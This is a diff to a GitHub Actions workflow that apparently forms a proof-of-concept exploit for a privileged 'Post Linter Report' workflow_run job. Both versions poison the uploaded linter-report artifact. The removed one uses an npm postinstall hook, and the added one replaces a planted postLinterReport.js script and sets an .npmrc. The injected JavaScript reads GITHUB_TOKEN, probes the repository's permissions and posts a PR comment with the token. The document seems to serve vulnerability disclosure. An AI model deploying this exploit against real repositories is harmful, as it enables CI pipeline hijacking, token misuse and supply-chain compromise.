@@ -8,40 +8,39 @@ jobs:
   lint:
     runs-on: ubuntu-latest
     steps:
-      - name: Build attacker-controlled linter-report artifact
+      - name: Produce attacker-controlled linter-report artifact
         run: |
-          mkdir -p pkg/package
-          cat > pkg/package/package.json <<'EOF'
-          {"name":"evil-dep","version":"1.0.0","scripts":{"postinstall":"node ./stage1.js"}}
-          EOF
-          cat > pkg/package/stage1.js <<'EOF'
+          mkdir -p node_modules/adp-devsite-scripts/linter-bot
+          cat > node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js <<'JS'
           const fs = require('fs');
-          console.log('[PoC] arbitrary code ran inside the privileged workflow_run job as uid=' + process.getuid());
-          const ws = require('path').resolve(__dirname, '..', '..');
-          const pr = fs.readFileSync(require('path').join(ws,'pr-number.txt'),'utf8').trim();
-          fs.writeFileSync('poc-marker.txt','marker');
+          const pr = fs.readFileSync('pr-number.txt', 'utf8').trim();
           const token = process.env.GITHUB_TOKEN;
-          console.log('[PoC] GITHUB_TOKEN present=' + Boolean(token) + ' length=' + String(token||'').length);
-          fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, {headers:{Authorization:'Bearer '+token,'X-GitHub-Api-Version':'2022-11-28'}})
-            .then(r=>{console.log('[PoC] GET repo status='+r.status);return r.json();})
-            .then(j=>console.log('[PoC] token permissions='+JSON.stringify(j.permissions||j.message)));
-          fetch('https://api.github.com/repos/'+process.env.GITHUB_REPOSITORY+'/issues/'+pr+'/comments',{method:'POST',headers:{Authorization:'Bearer '+token,Accept:'application/vnd.github+json','X-GitHub-Api-Version':'2022-11-28'},body:JSON.stringify({body:'PoC: this comment was written by attacker code executing via npm postinstall inside the privileged Post Linter Report workflow_run job.'})})
-            .then(r=>{console.log('[PoC] POST comment status='+r.status);return r.json();})
-            .then(j=>console.log('[PoC] comment url='+j.html_url));
-          EOF
-          (cd pkg && tar czf ../evil-dep.tgz package)
-          echo "attacker-controlled report" > linter-report.txt
+          console.log('[PoC] attacker-controlled JavaScript executed inside the privileged workflow_run job, uid=' + process.getuid());
+          console.log('[PoC] repo=' + process.env.GITHUB_REPOSITORY + ' pr=' + pr + ' token_length=' + String(token || '').length);
+          (async () => {
+            const h = { Authorization: 'Bearer ' + token, Accept: 'application/vnd.github+json', 'X-GitHub-Api-Version': '2022-11-28' };
+            const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY, { headers: h });
+            const j = await r.json();
+            console.log('[PoC] token-scoped GET repo status=' + r.status + ' permissions=' + JSON.stringify(j.permissions || j.message));
+            const c = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
+              method: 'POST', headers: { ...h, 'Content-Type': 'application/json' },
+              body: JSON.stringify({ body: 'PoC: posted by attacker-controlled code running inside the privileged `Post Linter Report` workflow_run job.' })
+            });
+            const cj = await c.json();
+            console.log('[PoC] privileged comment POST status=' + c.status + ' url=' + (cj.html_url || cj.message));
+          })();
+          JS
+          printf 'global=true\n' > .npmrc
+          echo "attacker controlled report" > linter-report.txt
           echo "${{ github.event.pull_request.number }}" > pr-number.txt
-          cat > package.json <<'EOF'
-          {"name":"poc","version":"1.0.0","allowScripts":{"evil-dep":true},"dependencies":{"evil-dep":"file:./evil-dep.tgz"}}
-          EOF
-          ls -la
-      - name: Upload artifact
+          ls -la . node_modules/adp-devsite-scripts/linter-bot
+      - name: Upload linter-report artifact
         uses: actions/upload-artifact@v4
         with:
           name: linter-report
+          include-hidden-files: true
           path: |
+            .npmrc
+            node_modules/adp-devsite-scripts/linter-bot/postLinterReport.js
             linter-report.txt
             pr-number.txt
-            package.json
-            evil-dep.tgz
